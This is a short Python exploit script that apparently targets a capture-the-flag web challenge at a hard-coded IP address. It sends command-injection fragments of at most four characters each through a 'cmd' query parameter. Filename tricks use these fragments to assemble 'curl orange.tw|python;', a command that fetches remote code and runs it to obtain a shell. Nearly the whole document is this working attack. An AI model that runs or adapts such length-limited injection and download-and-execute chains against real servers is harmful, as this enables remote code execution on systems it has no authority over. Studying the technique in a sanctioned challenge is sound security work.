import requests
from time import sleep
from urllib import quote

payload = [
    # generate "g> ht- sl" to file "v"
    '>dir', 
    '>sl', 
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',

    # generate "curl orange.tw|python;"
    '>\;\\', 
    '>on\\', 
    '>th\\', 
    '>py\\', 
    '>\|\\', 
    '>tw\\',
    '>e.\\', 
    '>ng\\', 
    '>ra\\', 
    '>o\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 

    # got shell
    'sh x', 
    'sh g', 
]


r = requests.get('http://52.197.41.31/?reset=1')
for i in payload:
    assert len(i) <= 4
    r = requests.get('http://52.197.41.31/?cmd=' + quote(i) )
    print i
    sleep(0.1)  